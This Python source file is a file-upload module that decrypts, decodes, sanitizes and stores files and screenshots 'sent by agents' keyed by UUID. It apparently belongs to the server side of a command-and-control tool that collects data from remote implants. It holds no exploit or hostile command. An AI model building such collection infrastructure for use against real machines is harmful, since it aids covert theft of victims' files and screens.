"""
File Upload Module
Module to manage upload of files sent by agents
"""

import os
import base64
import json
import re
from pathlib import Path
from crypto.aes_cipher import aes_encrypt_decrypt

class FileUploadManager:
    def __init__(self, upload_dir="uploads", logger=None):
        self.upload_dir = upload_dir
        self.logger = logger
        self._ensure_upload_directory()
    
    def _ensure_upload_directory(self):
        if not os.path.exists(self.upload_dir):
            os.makedirs(self.upload_dir)
            print(f"\033[92m[+]\033[0m Upload directory created: {self.upload_dir}")
            if self.logger:
                self.logger.log_event(f"UPLOAD - Directory created: {self.upload_dir}")
    
    def _sanitize_filename(self, filename):
        sanitized = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
        sanitized = re.sub(r'\.{2,}', '.', sanitized)
        sanitized = sanitized.lstrip('.')
        if len(sanitized) > 255:
            name, ext = os.path.splitext(sanitized)
            sanitized = name[:250] + ext
        return sanitized
    
    def _validate_upload_data(self, upload_data):
        required_fields = ['uuid', 'filename', 'content']
        for field in required_fields:
            if field not in upload_data:
                raise ValueError(f"Missing required field: {field}")
        if not upload_data['uuid'].strip():
            raise ValueError("UUID cannot be empty")
        if not upload_data['filename'].strip():
            raise ValueError("Filename cannot be empty")
        if not upload_data['content'].strip():
            raise ValueError("Content cannot be empty")
            
        standard_uuid_pattern = r'^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$'
        
        hex_uuid_pattern = r'^[a-fA-F0-9]+$'
        
        if not re.match(standard_uuid_pattern, upload_data['uuid']):

            if re.match(hex_uuid_pattern, upload_data['uuid']):
                print(f"\033[93m[WARNING]\033[0m UUID is not in the standard format, but is a valid hex identifier: {upload_data['uuid']}")
            else:
                print(f"\033[91m[ERROR]\033[0m UUID contains invalid characters: {upload_data['uuid']}")
                raise ValueError(f"UUID contains invalid characters: {upload_data['uuid']}")

    def _generate_safe_filename(self, uuid, original_filename):
        sanitized_filename = self._sanitize_filename(original_filename)
        name, ext = os.path.splitext(sanitized_filename)
        safe_filename = f"{uuid}_{name}{ext}"
        return safe_filename
    
    def process_upload_request(self, encrypted_data):
        try:
            decrypted_json = aes_encrypt_decrypt(encrypted_data, "decrypt")
            upload_data = json.loads(decrypted_json)
            self._validate_upload_data(upload_data)
            uuid = upload_data['uuid']
            original_filename = upload_data['filename']
            file_content_b64 = upload_data['content']
            
            is_screenshot = original_filename.lower().endswith(('.png', '.jpg', '.jpeg')) and '[SCREENSHOT]' in upload_data.get('metadata', '')
            
            if is_screenshot:
                safe_filename = f"screenshot_{uuid}.png"
            else:
                safe_filename = self._generate_safe_filename(uuid, original_filename)
                
            file_path = os.path.join(self.upload_dir, safe_filename)
            if os.path.exists(file_path):
                print(f"\033[93m[WARNING]\033[0m UPLOAD - File already exists, will be overwritten: {file_path}")
                if self.logger:
                    self.logger.log_event(f"UPLOAD - File overwritten: {safe_filename}")
            try:
                file_bytes = base64.b64decode(file_content_b64)
                print(f"\033[92m[+]\033[0m UPLOAD - File size: {len(file_bytes)} bytes")
            except Exception as e:
                raise ValueError(f"Error decoding base64 content: {e}")
            with open(file_path, 'wb') as f:
                f.write(file_bytes)
            result = {
                "success": True,
                "uuid": uuid,
                "original_filename": original_filename,
                "saved_filename": safe_filename,
                "file_path": file_path,
                "file_size": len(file_bytes),
                "message": "Successfully uploaded file"
            }
            print(f"\033[92m[+]\033[0m UPLOAD - File saved: {safe_filename} ({len(file_bytes)} bytes)")
            if self.logger:
                self.logger.log_event(f"UPLOAD - File received from {uuid[:8]} ({len(file_bytes)} bytes)")
            return result
        except json.JSONDecodeError as e:
            error_msg = f"Error parsing JSON: {e}"
            print(f"\033[91m[ERROR]\033[0m UPLOAD - {error_msg}")
            if self.logger:
                self.logger.log_event(f"UPLOAD - Invalid JSON: {e}")
            return {"success": False, "error": error_msg}
        except ValueError as e:
            error_msg = f"Invalid data: {e}"
            print(f"\033[91m[ERROR]\033[0m UPLOAD - {error_msg}")
            if self.logger:
                self.logger.log_event(f"UPLOAD - Invalid data: {e}")
            return {"success": False, "error": error_msg}
        except Exception as e:
            error_msg = f"Internal error: {e}"
            print(f"\033[91m[ERROR]\033[0m UPLOAD - {error_msg}")
            if self.logger:
                self.logger.log_event(f"UPLOAD - Internal error: {e}")
            return {"success": False, "error": error_msg}
    
    def get_upload_stats(self):
        try:
            if not os.path.exists(self.upload_dir):
                return {"total_files": 0, "total_size": 0}
            files = os.listdir(self.upload_dir)
            total_size = 0
            for filename in files:
                file_path = os.path.join(self.upload_dir, filename)
                if os.path.isfile(file_path):
                    total_size += os.path.getsize(file_path)
            return {
                "total_files": len(files),
                "total_size": total_size,
                "upload_dir": self.upload_dir
            }
        except Exception as e:
            print(f"[ERROR] UPLOAD - Error getting statistics: {e}")
            return {"error": str(e)}
    
    def list_uploaded_files(self):
        try:
            if not os.path.exists(self.upload_dir):
                return []
            files_info = []
            for filename in os.listdir(self.upload_dir):
                file_path = os.path.join(self.upload_dir, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    
                    uuid = "Unknown"
                    uuid_pattern = r'^([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})_'
                    uuid_match = re.match(uuid_pattern, filename)
                    
                    if uuid_match:
                        uuid = uuid_match.group(1)
                    elif filename.startswith('screenshot_'):
                        screenshot_pattern = r'^screenshot_([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})'
                        screenshot_match = re.match(screenshot_pattern, filename)
                        if screenshot_match:
                            uuid = screenshot_match.group(1)
                    elif '_' in filename:
                        hex_pattern = r'^([a-fA-F0-9]+)_'
                        hex_match = re.match(hex_pattern, filename)
                        if hex_match:
                            uuid = hex_match.group(1)
                    
                    files_info.append({
                        "filename": filename,
                        "uuid": uuid,
                        "size": stat.st_size,
                        "created": stat.st_ctime,
                        "modified": stat.st_mtime
                    })
            return files_info
        except Exception as e:
            print(f"\033[91m[ERROR]\033[0m UPLOAD - Error listing files: {e}")
            return []
